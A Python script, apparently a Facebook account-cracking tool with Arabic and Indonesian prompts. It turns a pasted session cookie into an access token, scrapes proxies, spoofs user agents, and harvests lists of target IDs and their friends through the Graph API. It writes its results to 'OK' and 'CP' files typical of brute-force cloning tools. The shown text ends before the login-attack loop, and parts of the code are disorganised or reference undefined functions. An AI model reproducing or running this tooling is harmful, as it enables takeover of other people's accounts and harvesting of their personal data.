
import requests,bs4,os,sys,random,datetime,time,re
try:
	import fake_useragent
except ModuleNotFoundError:
	print(' جاري تثبيت المكتبة المطلوبة .....')
	os.system('pip install fake-useragent')
import webbrowser
from fake_useragent import UserAgent
from rich.console import Console as sol
from concurrent.futures import ThreadPoolExecutor as tred
from rich.panel import Panel as nel
from rich import print as cetak
from rich import pretty
Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
ses = requests.Session()
F = '\033[2;32m'
Z = '\033[1;31m' 
L = "\033[1;95m"  #ارجواني
E = '\033[1;31m'
R = '\033[1;31m' #احمر
Ye = '\033[1;33m' #اصفر
G = '\033[2;32m' #اخضر
W = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
R = '\x1b[91;1m'
G = '\x1b[92;1m'
G = '\033[1;32m'
S = '\033[1;33m'
	#~~~~~~My Colors~~~~~~~~#
احمر = '\033[1;31m' #احمر
اصفر = '\033[1;33m' #اصفر
اخضر = '\033[2;32m' #اخضر
ابيض = "\033[1;97m" #ابيض
سمائي = '\033[2;36m'#سمائي
ازرقفاتح = '\033[1;34m' #ازرق فاتح.
ارجواني = "\033[1;95m"  #ارجواني
احمرثاني = '\033[2;31m' #احمر ثاني
ازرق = '\033[2;39m' #ازرق
وردي = '\033[2;35m' #وردي
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
a1 = '\x1b[1;31m'  # أحمر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أزرق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخضر داكن
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أصفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
a29 = '\x1b[38;5;233m'  # أسود داكن
a30 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح
a33 = '\x1b[38;5;94m'  # بني داكن
a34 = '\x1b[38;5;252m'  # رمادي فاتح
a35 = '\x1b[38;5;246m'  # رمادي داكن
a36 = '\x1b[38;5;228m'  # ذهبي فاتح
a37 = '\x1b[38;5;172m'  # ذهبي داكن
a38 = '\x1b[38;5;188m'  # فضي فاتح
a39 = '\x1b[38;5;247m'  # فضي داكن
a40 = '\x1b[0;34m'  # أزرق سماوي
import sys,time,os
class DEM:
    def __init__(self,z):
        for e in z+'\n':
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.000)

logo=(a4+'''⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣾⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣰⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢰⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣄⣀⣀⣤⣤⣶⣾⣿⣿⣿⡷
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀
⣿⣿⣿⡇⠀⡾⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀
⣿⣿⣿⣧⡀⠁⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠉⢹⠉⠙⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣀⠀⣀⣼⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠀⠤⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⠿⠋⢃⠈⠢⡁⠒⠄⡀⠈⠁⠀⠀⠀⠀⠀⠀⠀
⣿⣿⠟⠁⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
''')

def clear():
    os.system('clear')
def i():
    DEM(logo)
i()
print('\n\n\n')
token= input('''
  \x1b[1;97m  \033[33m𝙏𝙊𝙆𝙀𝙉 \x1b[1;97m: \x1b[1;92m''')
print('\x1b[38;5;117m')
print()
ID = input('\x1b[1;97m  \033[33m𝙄𝘿 \x1b[1;97m: \x1b[1;92m')
pretty.install()
CON=sol()
Hesion = ['Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5,Mozilla/5.0 (Linux; Android 10; SM-N960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FBAN/MessengerLite;FBAV/115.0.0.2.114;FBPN/com.facebook.mlite;FBLC/ar_EG;FBBV/257412622;FBCR/Orange - STAY SAFE;FBMF/Samsumg;FBBD/samsung;FBDV/Note9;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1369};Mozilla/5.0 (Linux; Android 10; SM-N960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FBAN/MessengerLite;FBAV/115.0.0.2.114;FBPN/com.facebook.mlite;FBLC/ar_EG;FBBV/257412622;FBCR/Orange - STAY SAFE;FBMF/Samsumg;FBBD/samsung;FBDV/Note9;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1369};Mozilla/5.0 (Linux; Android 10; SM-N960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FBAN/MessengerLite;FBAV/115.0.0.2.114;FBPN/com.facebook.mlite;FBLC/ar_EG;FBBV/257412622;FBCR/Orange - STAY SAFE;FBMF/Samsumg;FBBD/samsung;FBDV/Note9;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1369};Mozilla/5.0 (Linux; Android 10; SM-N960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FBAN/MessengerLite;FBAV/115.0.0.2.114;FBPN/com.facebook.mlite;FBLC/ar_EG;FBBV/257412622;FBCR/Orange - STAY SAFE;FBMF/Samsumg;FBBD/samsung;FBDV/Note9;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1369};']
ua = UserAgent()
user_ahd = ua.chrome
ugen2=[user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd]
ugen=[user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd]
cokbrut=[]
ses=requests.Session()
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
M = '\x1b[1;91m'
O = '\x1b[1;96m'
N = '\x1b[0m'    
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
def Hesion():
	try:
		token = open('.token.txt','r').read()
		cok = open('cokispppp.txt','r').read()
		tokenku.append(token)
		try:
			menu()
		except KeyError:
			login_lagi334()
	except IOError:
		login_lagi334()
def proxyes():
	from requests import get
	from random import choice,randint
	import sys,os
	bing = str(randint(99,499))
	prr = str(choice (['http','https']))
	ok = 0
	eror = 0
	while True:
		try:
			proxy = get(f"https://api.proxyscrape.com/v2/?request=displayproxies&protocol={prr}&timeout={bing}&country=all&ssl=all&anony mity=all").text
			open('proxyface.txt','a').write(proxy)
		except:
			eror+=1
			print(' Error ')
		with open('proxyface.txt','r') as file:
				lino = file.readlines()
				total = len(lino)
				ok+=1
		os.system('clear');print('\n')


		print('{}True Proxy /{} {} {}<¦> {}False Proxy / {}{} >> {}{}'.format(سمائي,اخضر,ok,سمائي,ارجواني,احمر,eror,ابيض,total));sys.stdout.flush()
		if ok == 100:
			exit(احمر+'\n- Finish • تم استخراج 100 بروكسي بنجاح ')
def login_lagi334():
	try:		
		os.system('clear')
		cookie=input(f'\033[2;32m- Cookies - ادخل كوكيز : ')
		rsn = requests.Session()
		try:
			rsn.headers.update({
'Accept-Language': 'id,en;q=0.9',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
'Referer': 'https://www.instagram.com/','Host': 'www.facebook.com',
'Sec-Fetch-Mode': 'cors',
'Accept': '*/*',
'Connection': 'keep-alive',
'Sec-Fetch-Site': 'cross-site',
'Sec-Fetch-Dest': 'empty',
'Origin': 'https://www.instagram.com',
'Accept-Encoding': 'gzip, deflate',
})
			response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&blueirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
			if '"access_token":' in str(response.headers):
			 	token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
			 	open(".token.txt", "w").write(token)
			 	print(' \033[2;32mOk Cokies Reset The Tool ✓ ')
			 	open("cokispppp.txt", "w").write(cookie)
			else:
			 print(" \033[1;31mBad Cokies No ✘")
		except:
			print(' Bad ')
	except:
		print(' Error.')
def menu():
    try:
        token = open('.توكنك','r').read()
        cok = open('.كوكيز','r').read()
    except IOError:
        print('[×] Cookies Kadaluarsa ')
        time.sleep(5)
        login_lagi334()
    os.system('clear')
    
    print(m+''''
⡘⡌⡎⢜⢌⢎⢪⢊⢎⢎⢎⢎⢎⢎⢎⢮⢪⢺⡸⡪⣎⢗⡝⡮⡳⢝⢎⢗⢝⢮⢯⢳⣫⢯⢯⢯⢯⢯⢯⢯⡯⣯⢯⡯⣯⡯⣯⢯⡯⡯
⢑⠕⡜⢜⢌⢎⢎⢪⠪⡢⡣⡣⡣⡳⡹⡸⣸⢱⢕⡝⡜⡜⡘⠌⡌⡢⢣⠣⡫⡪⡪⡣⡳⣝⢽⢽⢽⡽⣽⣫⡯⣯⢯⣟⣗⣯⢯⣟⢾⢽⣫⢿⣝⣗⢿
⢘⢜⠸⡘⡜⢜⢌⢎⢎⢎⢎⢪⢪⢪⢺⢸⢪⢺⢘⢈⢐⢐⢈⠌⠄⠅⡕⡑⢥⢱⢑⠕⡝⡼⣸⡹⢽⡽⣞⣗⣯⢿⡽⣞⣗⣯⣟⡾⣽⣻⣺⢽⣺⢞⣿
⢰⠡⡣⢱⢘⢌⠆⡇⡎⢆⢇⢇⢇⢇⢗⢝⠌⠨⢀⠢⠐⠄⡂⠨⠠⠡⠢⠨⡢⢢⢡⢑⠨⡘⢔⠝⡜⡞⣟⡾⣽⡽⣽⡽⣞⣷⣳⢯⣗⡷⣽⢽⣺⣻⣺
⢐⢕⢘⢌⢆⢣⠱⡱⢸⢘⢔⢕⢕⢕⠕⡡⠂⠡⢀⠐⡀⠅⠠⠁⠌⠠⠁⡁⠠⢁⠨⢈⠪⢢⢢⢑⠨⢣⢓⢟⣷⣻⣗⣿⢽⣾⣺⣟⡾⣝⣗⡯⣗⡷⣻
⡐⠥⡱⡨⢢⠱⡑⡅⢇⢕⠕⡕⢕⡑⡈⠄⢅⠊⡠⠂⡂⠌⠨⠀⢅⢢⢱⣨⣎⣦⣎⣆⡢⡠⢁⠣⡫⡢⡑⡝⣷⣻⢾⣽⣻⣞⣗⡷⡯⣟⡾⣝⣗⡯⣟
⠨⡑⡌⡌⢆⢣⠱⡸⡘⡜⢜⢜⠜⢀⠂⢅⠢⠨⡐⠨⠠⠈⠄⡕⣕⡷⣟⣯⣿⣳⣿⣻⣟⣮⡂⡂⡘⡌⡎⣜⢷⣻⣟⡾⣗⣯⣷⣻⢯⡷⡯⣗⣟⢾⢽
⡨⢂⠆⠕⡅⢕⢅⢣⢱⢸⢸⠰⠐⡀⡊⡢⢑⠡⠨⠀⠅⡊⣜⢾⣝⣯⣿⣽⣾⣻⡾⣯⡿⣞⣷⢐⠠⠨⠂⢇⠯⡿⣞⡿⣯⣷⣻⣞⣯⢯⣟⣗⡯⡯⣟
⠐⢅⠕⡑⢜⢰⠡⡣⡱⡱⡱⠡⠡⢊⢐⠨⠐⢈⠀⡁⡆⠎⡚⠽⠽⢷⣻⡾⣷⣟⡿⡯⠟⢫⡙⡔⡐⢈⠨⢪⢪⢻⣯⢿⣳⣟⣾⣳⢯⣟⡾⣺⢽⢽⢽
⠨⡢⡑⠜⡌⢆⠇⡇⡣⡣⡣⠁⠅⠢⡐⢈⠐⢀⠂⡕⢅⢎⠖⡑⠔⡐⢌⢽⢷⣻⡱⢐⠕⢍⠝⡗⠌⡀⡘⡐⡕⡝⣾⣻⡽⣞⡷⣯⣟⡮⡯⡯⡯⣯⣻
⠨⡂⢎⢪⠸⡰⡱⡱⡕⣇⢧⠁⠅⠁⠄⠂⢐⠠⠈⡎⡖⣔⡘⢦⢢⢇⢆⢕⣟⣯⣞⣼⢵⣳⣽⣺⡐⡀⡂⡐⢕⢱⣫⡷⣟⣯⣟⣗⣗⡯⡯⡯⡯⡷⣽
⠨⡊⡢⡱⡑⡕⡕⣕⢧⡣⡳⡡⢈⠐⡈⡐⠠⠀⠅⡪⡳⡵⣝⢮⢧⢇⣗⢗⣽⣯⢿⣾⣻⣽⣾⣟⡆⡂⠠⠂⡝⡰⢵⢿⡽⣞⡾⣺⢮⢯⢯⢯⢯⣻⣺
⠨⡊⡢⡱⡸⡸⡸⡪⢮⣪⠳⢀⢂⠐⡐⠄⠡⠈⠄⢱⠹⡪⣏⢯⣳⡫⣎⢯⢾⢾⢿⡽⣯⡿⣞⣯⠣⠠⠨⠠⡣⡣⡻⣽⢽⡳⡯⣗⡯⡯⡯⡯⣳⣳⢽
⢌⠆⡕⢜⢜⢜⢜⢮⡣⡳⡍⠐⠄⡨⢐⢁⠂⡁⠌⡐⢅⠣⡣⡣⡇⡗⢕⠑⠌⡋⠇⡟⡷⣟⣯⠺⠈⠄⢂⢑⠜⡜⣜⡯⡯⡯⣻⣪⢯⣫⢾⢝⣗⢗⡯
⢅⢣⢱⢱⢱⢱⡹⡜⣎⢧⠃⢌⠂⠢⡁⡂⠄⠂⡐⢀⢂⠑⡘⢜⠘⡈⠐⡈⢔⢒⢅⠂⠅⡓⡳⡩⠨⠐⡐⡐⡕⡵⡱⡯⡯⡯⣳⡳⣝⡮⡯⣳⢽⢵⣫
⢊⢎⢪⢪⢪⢪⡪⡺⡜⡎⡂⡂⠅⡑⡐⡐⠠⠁⠄⠂⢐⢀⠊⢐⢈⠠⠨⡈⢓⢙⠑⠅⠅⠄⠕⣌⢊⠀⡂⡂⣇⢳⢱⡫⣗⡽⣕⢯⢞⡮⣻⣪⢯⡳⣳
⠪⡪⢪⢪⢪⢪⢪⢪⢺⡘⠄⢌⢂⠊⠔⠠⠁⡂⢂⠈⡀⠠⠈⠄⢀⢂⢅⢐⢐⠔⡡⡁⢅⠨⠐⢌⠂⠠⠐⡨⡲⡹⣘⣞⡵⡯⣺⢽⢕⣯⣳⡳⡽⣺⢵
⢜⢸⠸⡘⡜⢜⢜⢜⢕⠌⠌⢔⠠⠡⠡⡁⢂⠐⡀⠢⡀⠐⢀⠁⡂⢂⠢⢑⠅⡕⢕⠕⠅⢂⠨⠀⠂⡁⠄⡕⡕⡕⡕⢮⡺⡽⣕⡯⡯⣺⣜⣞⢽⣪⢯
⠔⡅⢇⢣⠣⡣⡃⡇⡣⠡⡡⢑⠨⡈⡂⡂⢂⠂⠄⡑⢄⠅⢄⠠⠐⠀⢂⠐⠀⡂⢐⠀⠅⠐⡀⠅⠂⡀⠢⡱⢱⢱⢝⢜⢮⡫⣞⢮⡻⣪⢞⡼⡳⣕⢯
⢌⢪⢘⢔⢑⢕⢘⢌⠪⢐⠌⡂⡂⡂⡂⢂⢂⠐⡐⢌⢒⠌⡢⢢⠨⡐⠄⡂⢅⢐⢄⢢⢨⢂⠊⠄⠂⢌⠸⡘⡜⣜⢕⢸⢸⢎⣗⢽⡪⡗⣯⡺⣝⢮⢯
⠢⡑⢔⠡⡊⡢⠱⡨⠨⡐⡐⡐⠠⠂⠌⡀⡂⡐⡀⢎⢢⠣⡘⢜⢜⢌⣎⢮⣺⣺⡺⡝⡜⢄⠡⠀⠅⡂⢅⠇⡇⣇⢃⢎⢮⣳⢱⢳⢝⢮⣪⢺⢕⢯⡳
⢑⢌⠢⡑⢌⠌⡊⠄⠅⡂⠢⠨⠐⡁⠡⠐⡀⡂⠄⡷⡱⡵⡌⡪⡾⡽⡮⣻⣪⢗⣽⣪⢃⠂⠄⡁⠢⡈⡢⡑⢕⠪⡐⢌⢮⢪⢪⢪⢫⡳⣕⢕⡕⡕⢜
⠢⠢⢑⠨⠐⡀⡂⠌⢌⢐⠡⢁⠂⢂⠁⠅⡂⡐⠠⣯⡳⡽⣺⢨⢺⣹⡽⣞⡾⡝⡎⠆⢂⠐⢀⠂⡁⡂⡢⠨⡐⠅⠌⡢⠱⡱⢱⠨⡣⡫⡎⡗⡕⡕⡱
⢌⠨⢀⠂⠡⢀⠂⡑⡐⡐⠨⠠⠈⠄⠌⡂⠔⠠⢱⣳⣝⢾⢽⣪⣯⡷⡻⣱⢕⡇⢏⢈⠠⠐⠀⢂⢂⢂⠢⢑⠨⠠⢑⠠⡑⠅⢅⠕⡘⢜⢜⠸⡐⢌⢂
⠐⡐⠐⡈⠌⡀⡂⡂⠢⠨⠨⠠⠁⠅⡊⠄⠌⠠⡳⣳⢇⣯⡯⣗⢗⢵⢽⡺⡕⡃⠅⠄⠐⡀⡁⢂⠔⠠⡑⢠⠡⠈⠔⡐⠨⡈⡢⠡⢊⠔⡰⢑⢑⠔⡐
⠡⠠⠡⠐⢐⠀⡂⠌⠌⠌⠌⠄⠡⡁⡂⠌⠠⠡⡯⣳⢯⡳⣝⣮⣳⢯⢷⠝⢌⢂⠡⠈⠄⡐⡀⠢⡈⠢⠨⡐⠀⠅⠅⠌⡂⡂⡊⢌⢐⠨⢐⠡⢂⢊⠔
⠨⠠⠡⠈⠄⠂⠄⠅⠅⠅⠅⠌⢂⢂⠐⡈⠄⡱⡯⡯⣳⢯⣗⡷⣫⢯⢇⠣⠡⢂⠐⢈⠀⡐⠠⠡⠨⡈⠢⡈⠄⠡⠡⡁⡂⠢⡈⡂⡂⠨⢐⠨⢐⠐⢌
⠄⠅⠌⠄⠡⠈⠄⠅⠅⢅⠡⠨⢐⢀⠂⠔⡀⣯⣫⢾⢯⣟⡮⣯⢯⠏⠢⡑⠅⡂⠨⠀⡐⠠⢁⠪⢐⠨⠂⠄⠂⠡⡁⠢⡈⡂⠢⡂⢌⠐⡐⠨⠠⠡⠡ ''')

    print(b+'1-Proxy(استخراج  بروكسيات) ')
    print(h+'2- 𝙴𝙳𝙳𝙸𝙴 𝚂 𝙵𝙸l𝙴 (ملف ايديات)')
    print(kk+'0- 𝙔𝙊𝙐 𝙀𝙓𝘾𝙃𝘼𝙉𝙂𝙀 𝘾𝙊𝙊𝙆𝙄𝙀𝙎 : ')
    _____alvino__adijaya_____ = input(m+'\n 𝘾𝙃𝙊𝙊𝙎𝙀 :')
    if _____alvino__adijaya_____ in ['1']:
        proxyes()
    elif _____alvino__adijaya_____ in ['2']:
        file_2()
    elif _____alvino__adijaya_____ in ['0']:
        os.system('rm -rf .توكنك')
        os.system('rm -rf .كوكيز')
        print('>> Done Logout+Hapus Kukis ')
        exit()
    else:
        print('>> PILIH YANG BENAR ')
        back()
def error():
    print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
    time.sleep(4)
    back()
def file_2():
	try:
		open('proxyface.txt','r').read()
	except FileNotFoundError:
		exit('\n - Bad - عليك استخراج بروكسيات اولا ')
	else:
		with open('proxyface.txt','r') as fileoo:
			lino = fileoo.readlines()
			total = len(lino)
			if total < 100:
				exit('- Bad - عليك استخراج 100 بروكسي على الاقل')
			else:
				print('')
	try:
		jum = input(f'\033[2;32m 𝙴𝙳𝙳𝙸𝙴𝚂 𝙵𝙸l𝙴 :')
		for line in open(jum, 'r').readlines():
			id.append(line.strip())
		print('- Total id • الايديات : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
			print('[✘] No Connection  ')
			exit()
	except (KeyError,IOError):
			print('[✘] Id Is Not Public')
			time.sleep(3)

def vip_id():
	try:
		open('proxyface.txt','r').read()
	except FileNotFoundError:
		exit('\n - Bad - عليك استخراج بروكسيات اولا ')
	else:
		with open('proxyface.txt','r') as fileoo:
			lino = fileoo.readlines()
			total = len(lino)
			if total < 100:
				exit('- Bad - عليك استخراج 100 بروكسي على الاقل')
			else:
				print('')
	try:
		token = open('.token.txt','r').read()
		cok = open('cokispppp.txt','r').read()
	except IOError:
		exit()
	try:
		ارجواني = "\033[1;95m"  #ارجواني
		اخضر = '\033[2;32m' #اخضر
		jum = int(input(f'\n{ارجواني}- How Many id •{اخضر} كم ايدي تريد تصيد : '))
	except ValueError:
		print('>> Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('>> Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'\n{ارجواني}- ID >{اخضر} ادخل الايدي '+str(yz)+' : ')
		uid.append(kl)
	for user in uid:
	    try:
	       uaidcrac = random.choice(ugen)
	       head = (
	       {"user-agent": f'{uaidcrac}'
	       })
	       if len(id) == 0:
	           params = (
	           {
	            'access_token': token,
	            'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	            'access_token': token,
	            'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	try:
		print('')
		print(H+f'{ارجواني} > Total id >{اخضر} عدد الايديات {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')

def setting():
	print(B+''*25)
	hu = '3'
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> PILIH YANG BENAR BANG ')
